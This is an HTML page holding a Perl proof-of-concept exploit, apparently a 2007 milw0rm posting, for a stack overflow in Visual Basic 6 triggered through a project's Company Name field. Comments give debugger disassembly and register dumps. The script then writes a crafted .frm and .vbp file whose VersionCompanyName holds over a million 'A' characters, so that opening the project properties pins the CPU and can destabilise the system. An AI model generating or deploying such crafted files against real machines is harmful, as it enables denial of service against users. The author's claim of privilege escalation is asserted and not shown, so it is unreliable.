<html><head><title>Microsoft Visual Basic 6.0 Project (Company Name) Stack overflow PoC</title></head><pre>#!/usr/local/bin/perl


#Discovered By UmZ (Umair Manzoor)
#comments are welcome at umz32.dll[at]gmail.com
#Dated 23-02-2007
#Time : 02:00 AM PST
#
#Visual Basic Project (Company Name) Stack Overflow
#Affected Version  : Tested on Visual basic 6
#Threats : DoS, Previlidges Escilation (System become unstable for more then 40 minutes and so)
#From : Local system
#
#Actually Exception occur again and again and again make 100% usage of CPU
#
#
#*The vulnerability would not effect until the project description (Project Property page and select Company Name) has been opened up to view.
#
#*When binary file is generated with crafted Visual basic project it would not contain any details of vendor and other information.

#Details:
#       Owned Registers are ESI and EDI. Compnay name is dumped at Memory Address of : 04520020. Due to stack overflow USER32 stuck into loop (that last #       for more then 30 minutes in testing).
#         
#	The CPU usuage becomes 100% causing the system to become unstable and can crash the OS if enduser is on low system memory. This vulnerability can
#       be exploit to cause DOS or Previledge escilation. UNICODE exploitation must be implemented in order to exploit this vulnerability. 
#	The generated Binary File is also attached which cann't display any of details of vendor information in EXE format (due to overflow).
#
#Debug Details:
#      This is the debug details which clearly mention the loop in which exception got stuck, causing it to occur again and again
#
#77D8D96F   837D F8 00       CMP DWORD PTR SS:[EBP-8],0
#77D8D973   74 08            JE SHORT USER32.77D8D97D
#77D8D975   3C 20            CMP AL,20
#77D8D977   74 04            JE SHORT USER32.77D8D97D
#77D8D979   3C 09            CMP AL,9
#77D8D97B   75 2C            JNZ SHORT USER32.77D8D9A9
#77D8D97D   3C 0D            CMP AL,0D
#77D8D97F   74 28            JE SHORT USER32.77D8D9A9
#77D8D981   50               PUSH EAX
#77D8D982   53               PUSH EBX
#77D8D983   E8 68FAFFFF      CALL USER32.77D8D3F0
#77D8D988   85C0             TEST EAX,EAX
#77D8D98A   75 1D            JNZ SHORT USER32.77D8D9A9
#77D8D98C   47               INC EDI
#77D8D98D   8A07             MOV AL,BYTE PTR DS:[EDI]
#77D8D98F   3C 20            CMP AL,20
#77D8D991   74 04            JE SHORT USER32.77D8D997
#77D8D993   3C 09            CMP AL,9
#77D8D995   75 07            JNZ SHORT USER32.77D8D99E
#77D8D997   C745 F8 01000000 MOV DWORD PTR SS:[EBP-8],1
#77D8D99E   807F FF 0A       CMP BYTE PTR DS:[EDI-1],0A
#77D8D9A2   74 05            JE SHORT USER32.77D8D9A9
#77D8D9A4   3B7D 10          CMP EDI,DWORD PTR SS:[EBP+10]
#77D8D9A7  ^72 C6            JB SHORT USER32.77D8D96F
#
#
#Values of Register are as follows:
#EAX 00000041
#ECX 09E0C300
#EDX 00150608
#EBX 001DC0C0
#ESP 0013E900
#EBP 0013E914
#ESI 04520020 ASCII #&quot;AAAAAAAAAAAAAAAAA......... truncated

#EDI 045E61D0 ASCII #&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ..... truncated
#EIP 77D8D96F USER32.77D8D96F
#
#
#	    Disclaimer: This Proof of concept exploit is for educational purpose only.
#		        Please do not use it against any system without prior permission.
#          		You are responsible for yourself for what you do with this code.

# This exploit is just POC, it will generate the crafted VB project.


print(&quot;\nVisual Basic Company Name Stack overflow&quot;);
print(&quot;\nAffected Version  : Tested on Visual basic 6&quot;);
print(&quot;\nThreats : DoS, Previlidges Escilation&quot;);
print(&quot;\nFrom : Local system&quot;);
print(&quot;\n----------------------------------------------&quot;);
print(&quot;\nDiscovered &amp; Coded by UmZ&quot;); 
print(&quot;\numz32.dll[at]gmail.com&quot;);
 

open (MYFILE, '&gt;&gt;Form2.frm');
print MYFILE &quot;VERSION 5.00\n&quot;;
print MYFILE &quot;Begin VB.Form Form1\n&quot;; 
print MYFILE q(Caption         =   &quot;Form1&quot;);
print MYFILE &quot;\nClientHeight    =   3495\n&quot;;
print MYFILE &quot;ClientLeft      =   60\n&quot;;
print MYFILE &quot;ClientTop       =   345\n&quot;;
print MYFILE &quot;ClientWidth     =   4680\n&quot;;
print MYFILE q(LinkTopic       =   &quot;Form1&quot;);
print MYFILE &quot;\nScaleHeight     =   3495\n&quot;;
print MYFILE &quot;ScaleWidth      =   4680\n&quot;;
print MYFILE &quot;StartUpPosition =   3  'Windows Default\n&quot;;
print MYFILE &quot;Begin VB.CommandButton Command2\n&quot;; 
print MYFILE q(Caption         =   &quot;write&quot;);
print MYFILE &quot;\nHeight          =   495\n&quot;;
print MYFILE &quot;Left            =   2400\n&quot;;
print MYFILE &quot;TabIndex        =   2\n&quot;;
print MYFILE &quot;Top             =   2640\n&quot;;
print MYFILE &quot;Width           =   1935\n&quot;;
print MYFILE &quot;End\n&quot;;
print MYFILE &quot;Begin VB.TextBox Text1\n&quot;; 
print MYFILE &quot;Height          =   2175\n&quot;;
print MYFILE &quot;Left            =   480\n&quot;;
print MYFILE &quot;MultiLine       =   -1  'True\n&quot;;
print MYFILE &quot;TabIndex        =   1\n&quot;;
print MYFILE q(Text            =   &quot;Form1.frx&quot;:0000);
print MYFILE &quot;\nTop             =   360\n&quot;;
print MYFILE &quot;Width           =   3855\n&quot;;
print MYFILE &quot;End\n&quot;;
print MYFILE &quot;Begin VB.CommandButton Command1\n&quot;; 
print MYFILE q(Caption         =   &quot;read&quot;);
print MYFILE &quot;\nHeight          =   495\n&quot;;
print MYFILE &quot;Left            =   480\n&quot;;
print MYFILE &quot;TabIndex        =   0\n&quot;;
print MYFILE &quot;Top             =   2640\n&quot;;
print MYFILE &quot;Width           =   1935\n&quot;;
print MYFILE &quot;End\n&quot;;
print MYFILE &quot;End\n&quot;;

print MYFILE q(Attribute VB_Name = &quot;Form1&quot;);
print MYFILE &quot;\nAttribute VB_GlobalNameSpace = False\n&quot;;
print MYFILE &quot;Attribute VB_Creatable = False\n&quot;;
print MYFILE &quot;Attribute VB_PredeclaredId = True\n&quot;;
print MYFILE &quot;Attribute VB_Exposed = False\n&quot;;
close (MYFILE);

open (MYFILE, '&gt;&gt;vuln2.vbp');
print MYFILE &quot;Type=Exe\n&quot;;
print MYFILE &quot;Reference=*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#..\\..\\..\\..\\WINDOWS\\system32\\stdole2.tlb#OLE Automation\n&quot;;
print MYFILE &quot;Reference=*\\G{420B2830-E718-11CF-893D-00A0C9054228}#1.0#0#..\\..\\..\\..\\WINDOWS\\system32\\scrrun.dll#Microsoft Scripting Runtime\n&quot;;
print MYFILE &quot;Form=Form2.frm\n&quot;;
print MYFILE q(Startup=&quot;Form2&quot;);
print MYFILE &quot;\nHelpFile=&quot;.q(&quot;&quot;);
print MYFILE &quot;\nCommand32=&quot;.q(&quot;&quot;);
print MYFILE &quot;\nName=&quot;.q(&quot;Project1&quot;);
print MYFILE &quot;\nHelpContextID=&quot;.q(&quot;0&quot;);
#print MYFILE &quot;\nDescription=&quot;.q(&quot;).&quot;A&quot; x1037690 .q(&quot;);
print MYFILE &quot;\nCompatibleMode=&quot;.q(&quot;0&quot;);
print MYFILE &quot;\nMajorVer=1&quot;;
print MYFILE &quot;\nMinorVer=0&quot;;
print MYFILE &quot;\nRevisionVer=0&quot;;
print MYFILE &quot;\nAutoIncrementVer=0&quot;;
print MYFILE &quot;\nServerSupportFiles=0&quot;;
print MYFILE &quot;\nVersionCompanyName=&quot;.q(&quot;).&quot;A&quot; x1037690 .q(&quot;);
print MYFILE &quot;\nCompilationType=0&quot;;
print MYFILE &quot;\nOptimizationType=0&quot;;
print MYFILE &quot;\nFavorPentiumPro(tm)=0&quot;;
print MYFILE &quot;\nCodeViewDebugInfo=0&quot;;
print MYFILE &quot;\nNoAliasing=0&quot;;
print MYFILE &quot;\nBoundsCheck=0&quot;;
print MYFILE &quot;\nOverflowCheck=0&quot;;
print MYFILE &quot;\nFlPointCheck=0&quot;;
print MYFILE &quot;\nFDIVCheck=0&quot;;
print MYFILE &quot;\nUnroundedFP=0&quot;;
print MYFILE &quot;\nStartMode=0&quot;;
print MYFILE &quot;\nUnattended=0&quot;;
print MYFILE &quot;\nRetained=0&quot;;
print MYFILE &quot;\nThreadPerObject=0&quot;;
print MYFILE &quot;\nMaxNumberOfThreads=1&quot;;
print MYFILE &quot;\n[MS Transaction Server]&quot;;
print MYFILE &quot;\nAutoRefresh=1&quot;;

close (MYFILE);

print(&quot;\n\nCrafted Project has been generated!!!\n\n&quot;);

# milw0rm.com [2007-05-23]</pre></html>